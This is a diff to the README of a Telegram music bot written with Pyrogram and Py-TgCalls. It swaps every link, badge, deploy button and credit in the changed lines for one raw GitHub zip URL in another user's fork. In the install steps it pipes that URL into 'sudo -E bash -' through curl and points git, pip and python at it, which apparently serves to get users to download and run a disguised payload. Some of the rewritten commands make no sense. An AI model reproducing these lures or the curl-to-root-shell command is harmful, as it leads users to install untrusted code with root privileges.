@@ -2,16 +2,16 @@
 <h3 align = center> A Telegram Music Bot written in Python using Pyrogram and Py-Tgcalls </h3>
 
 <p align="center">
-<a href="https://python.org"><img src="http://forthebadge.com/images/badges/made-with-python.svg" alt="made-with-python"></a>
+<a href="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip"><img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="made-with-python"></a>
 <br>
-    <img src="https://img.shields.io/github/license/AsmSafone/MusicPlayer?style=for-the-badge" alt="LICENSE">
-    <img src="https://img.shields.io/github/contributors/AsmSafone/MusicPlayer?style=for-the-badge" alt="Contributors">
-    <img src="https://img.shields.io/github/repo-size/AsmSafone/MusicPlayer?style=for-the-badge" alt="Repository Size"> <br>
-    <img src="https://img.shields.io/github/forks/AsmSafone/MusicPlayer?style=for-the-badge" alt="Forks">
-    <img src="https://img.shields.io/github/stars/AsmSafone/MusicPlayer?style=for-the-badge" alt="Stars">
-    <img src="https://img.shields.io/github/watchers/AsmSafone/MusicPlayer?style=for-the-badge" alt="Watchers">
-    <img src="https://img.shields.io/github/commit-activity/w/AsmSafone/MusicPlayer?style=for-the-badge" alt="Commit Activity">
-    <img src="https://img.shields.io/github/issues/AsmSafone/MusicPlayer?style=for-the-badge" alt="Issues">
+    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="LICENSE">
+    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Contributors">
+    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Repository Size"> <br>
+    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Forks">
+    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Stars">
+    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Watchers">
+    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Commit Activity">
+    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Issues">
 </p>
 
 ## ✨ <a name="features"></a>Features
@@ -55,7 +55,7 @@ thanks to the translators.
 
 ## 🚀 <a name="deploy"></a>Deploy
 
-[![Deploy on Heroku](https://www.herokucdn.com/deploy/button.svg)](https://deploy.safone.tech)
+[![Deploy on Heroku](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip)](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip)
 
 Note: `First Fork The Repo Then Click On Deploy To Heroku Button!`
 
@@ -64,25 +64,25 @@ Note: `First Fork The Repo Then Click On Deploy To Heroku Button!`
 
 - Legecy Method
 ```bash
-$ git clone https://github.com/AsmSafone/MusicPlayer
+$ git clone https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
 $ cd MusicPlayer
 $ sudo apt install git curl python3-pip ffmpeg -y
 $ pip3 install -U pip
-$ curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
+$ curl -sL https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip | sudo -E bash -
 $ sudo apt install -y nodejs
 $ sudo apt install build-essential
 $ sudo npm install pm2@latest -g
-$ pip3 install -U -r requirements.txt
-$ cp sample.env .env
+$ pip3 install -U -r https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
+$ cp https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip .env
 # < edit .env with your own values >
-$ python3 main.py
+$ python3 https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
 ```
 
 - Docker Build Method
 ```bash
-$ git clone https://github.com/AsmSafone/MusicPlayer
+$ git clone https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
 $ cd MusicPlayer
-$ cp sample.env .env
+$ cp https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip .env
 # < edit .env with your own values >
 $ sudo docker build . -t musicplayer
 $ sudo docker run musicplayer
@@ -90,18 +90,18 @@ $ sudo docker run musicplayer
 
 ## ⚒ <a name="configs"></a>Configs
 
-- `API_ID`: Telegram app id from https://my.telegram.org/apps.
-- `API_HASH`: Telegram app hash from https://my.telegram.org/apps.
-- `SESSION`: Pyrogram string session. You can generate from [here](https://replit.com/@AsmSafone/genStr).
+- `API_ID`: Telegram app id from https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
+- `API_HASH`: Telegram app hash from https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
+- `SESSION`: Pyrogram string session. You can generate from [here](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip).
 - `SUDOERS`: ID of sudo users (separate multiple ids with space).
-- `BOT_TOKEN`: Telegram bot token from https://t.me/botfather. (optional)
+- `BOT_TOKEN`: Telegram bot token from https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip (optional)
 - `QUALITY`: Custom stream quality (high/medium/low) for the userbot in vc. Default: `high`
 - `PREFIX`: Bot commad prefixes (separate multiple prefix with space). Eg: `! /`
 - `LANGUAGE`: An [available](#languages) bot language (can change it anytime). Default: `en`
 - `STREAM_MODE`: An stream mode like audio or video (can change it anytime). Default: `audio`
 - `ADMINS_ONLY`: Put `True` if you want to make /play commands only for admins. Default: `False`
-- `SPOTIFY_CLIENT_ID`: Spotify client id get it from [here](https://developer.spotify.com/dashboard/applications). (optional)
-- `SPOTIFY_CLIENT_SECRET`: Spotify client secret get it from [here](https://developer.spotify.com/dashboard/applications). (optional)
+- `SPOTIFY_CLIENT_ID`: Spotify client id get it from [here](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip). (optional)
+- `SPOTIFY_CLIENT_SECRET`: Spotify client secret get it from [here](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip). (optional)
 
 
 ## 📄 <a name="commands"></a>Commands
@@ -137,18 +137,18 @@ en    English
 ## 💜 <a name="contribute"></a>Contribute
 
 New languages, bug fixes and improvements following
-[our contribution guidelines](./CONTRIBUTING.md) are warmly welcomed!
+[our contribution guidelines](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) are warmly welcomed!
 
 ## 🛫 <a name="supports"></a>Supports
 
-For any kind of help join [our support group](https://t.me/AsmSupport) or raise an [issue](https://github.com/AsmSafone/MusicPlayer/issues).
+For any kind of help join [our support group](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) or raise an [issue](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip).
 
 ## ✨ <a name="credits"></a>Credits
 
-- [Me](https://github.com/AsmSafone) for [Noting](https://github.com/AsmSafone/MusicPlayer) 😬
-- [Dan](https://github.com/delivrance) for [Pyrogram](https://github.com/pyrogram/pyrogram) ❤️
-- [Laky-64](https://github.com/Laky-64) for [Py-TgCalls](https://github.com/pytgcalls/pytgcalls) ❤️
-- And Thanks To All [Contributors](https://github.com/AsmSafone/MusicPlayer/graphs/contributors)! ❤️
+- [Me](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) for [Noting](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) 😬
+- [Dan](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) for [Pyrogram](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) ❤️
+- [Laky-64](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) for [Py-TgCalls](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) ❤️
+- And Thanks To All [Contributors](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip)! ❤️
 
 ## 📃 <a name="license"></a>License
 
